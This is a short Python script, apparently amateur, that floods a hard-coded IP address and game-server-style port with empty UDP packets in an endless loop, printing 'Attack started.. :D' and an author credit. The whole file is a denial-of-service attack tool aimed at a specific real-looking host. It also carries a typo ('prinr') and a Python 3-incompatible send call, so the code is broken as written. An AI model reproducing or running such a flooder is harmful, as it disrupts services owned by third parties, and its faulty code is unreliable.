import socket

ip = "46.174.48.156"
port = 27016
packet = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("Attack started.. :D")
prinr("Coded by Berk")

while True:
    packet.sendto('', (ip, port))
